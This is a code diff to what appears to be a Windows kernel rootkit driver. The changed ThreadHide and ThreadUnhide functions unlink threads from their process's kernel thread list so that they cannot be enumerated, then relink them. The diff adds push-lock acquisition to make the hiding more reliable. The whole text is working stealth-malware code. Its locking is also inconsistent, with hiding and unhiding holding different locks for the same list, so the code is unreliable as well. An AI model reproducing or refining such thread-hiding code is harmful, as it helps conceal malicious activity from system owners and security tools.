@@ -99,11 +99,14 @@ NTSTATUS ThreadHide(ULONG ThreadId) {
   PETHREAD targetThread = NULL;
   PEPROCESS owningProcess = NULL;
   ULONG threadListOffset = GetThreadListEntryOffset();
+  ULONG lockOffset = GetThreadLockOffset();
+  PLIST_ENTRY threadListEntry;
+  PEX_PUSH_LOCK listLock;
 
   if (ThreadId == 0)
     return STATUS_INVALID_PARAMETER;
 
-  if (threadListOffset == 0)
+  if (threadListOffset == 0 || lockOffset == 0)
     return STATUS_UNSUCCESSFUL;
 
   if (IsThreadHidden(ThreadId))
@@ -119,20 +122,31 @@ NTSTATUS ThreadHide(ULONG ThreadId) {
     return STATUS_UNSUCCESSFUL;
   }
 
-  PLIST_ENTRY threadListEntry =
-      (PLIST_ENTRY)((PUCHAR)targetThread + threadListOffset);
+  threadListEntry = (PLIST_ENTRY)((PUCHAR)targetThread + threadListOffset);
 
   if (!AddHiddenThread(ThreadId, threadListEntry, targetThread)) {
     ObDereferenceObject(targetThread);
     return STATUS_INSUFFICIENT_RESOURCES;
   }
 
+  //
+  // The kernel walks ETHREAD.ThreadListEntry under the thread's own push lock
+  // (PsEnumerateProcesses, NtQuerySystemInformation, thread exit). Unlinking
+  // without it races those walks and corrupts the per-process thread list.
+  //
+  listLock = (PEX_PUSH_LOCK)((PUCHAR)targetThread + lockOffset);
+
+  ExAcquirePushLockExclusive(listLock);
   __try {
     RemoveEntryList(threadListEntry);
     threadListEntry->Flink = threadListEntry;
     threadListEntry->Blink = threadListEntry;
   } __except (EXCEPTION_EXECUTE_HANDLER) {
     status = GetExceptionCode();
+  }
+  ExReleasePushLockExclusive(listLock);
+
+  if (!NT_SUCCESS(status)) {
     RemoveHiddenThread(ThreadId);
     ObDereferenceObject(targetThread);
     DbgPrint("Hide thread %lu faulted: 0x%X\n", ThreadId, status);
@@ -148,12 +162,14 @@ NTSTATUS ThreadUnhide(ULONG ThreadId) {
   PETHREAD targetThread = NULL;
   PLIST_ENTRY originalLinks = NULL;
   ULONG threadListOffset = GetThreadListEntryOffset();
+  ULONG threadListHeadOffset = GetThreadListHeadOffset();
+  ULONG lockOffset = GetProcessLockOffset();
   ULONG i;
 
   if (ThreadId == 0)
     return STATUS_INVALID_PARAMETER;
 
-  if (threadListOffset == 0)
+  if (threadListOffset == 0 || threadListHeadOffset == 0 || lockOffset == 0)
     return STATUS_UNSUCCESSFUL;
 
   ExAcquireFastMutex(&g_HiddenThreadLock);
@@ -173,13 +189,20 @@ NTSTATUS ThreadUnhide(ULONG ThreadId) {
 
   if (owningProcess) {
     PLIST_ENTRY processThreadList =
-        (PLIST_ENTRY)((PUCHAR)owningProcess + GetThreadListHeadOffset());
+        (PLIST_ENTRY)((PUCHAR)owningProcess + threadListHeadOffset);
+    // The relink target is the owning process's thread list, so its EPROCESS
+    // push lock is the one that has to be held here.
+    PEX_PUSH_LOCK listLock =
+        (PEX_PUSH_LOCK)((PUCHAR)owningProcess + lockOffset);
+
+    ExAcquirePushLockExclusive(listLock);
     __try {
       InsertHeadList(processThreadList, originalLinks);
     } __except (EXCEPTION_EXECUTE_HANDLER) {
       status = GetExceptionCode();
       DbgPrint("Unhide thread %lu faulted: 0x%X\n", ThreadId, status);
     }
+    ExReleasePushLockExclusive(listLock);
   } else {
     DbgPrint("Thread %lu owner process exited while hidden.\n", ThreadId);
   }
@@ -188,7 +211,7 @@ NTSTATUS ThreadUnhide(ULONG ThreadId) {
   RemoveHiddenThread(ThreadId);
 
   DbgPrint("Revealed thread %lu.\n", ThreadId);
-  return STATUS_SUCCESS;
+  return status;
 }
 
 NTSTATUS ThreadListHidden(PTHREAD_LIST_RESPONSE Response) {
